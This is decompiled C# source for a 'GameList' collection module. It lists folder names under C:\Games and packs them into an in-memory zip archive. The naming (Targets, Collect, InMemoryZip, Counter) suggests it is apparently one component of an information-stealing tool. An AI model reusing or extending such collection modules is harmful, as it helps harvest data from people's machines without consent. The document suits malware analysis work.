using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using Intelix.Helper.Data;

namespace Intelix.Targets.Device
{
	// Token: 0x0200002D RID: 45
	public class GameList : ITarget
	{
		// Token: 0x0600007D RID: 125 RVA: 0x00006300 File Offset: 0x00004500
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = "C:\\Games";
			bool flag = Directory.Exists(path);
			if (flag)
			{
			IEnumerable<string> directories = Directory.GetDirectories(path);
			List<string> list = directories.Select(Path.GetFileName).ToList<string>();
				bool flag2 = list.Any<string>();
				if (flag2)
				{
					zip.AddTextFile("Games.txt", string.Join("\n", list));
				}
			}
		}
	}
}
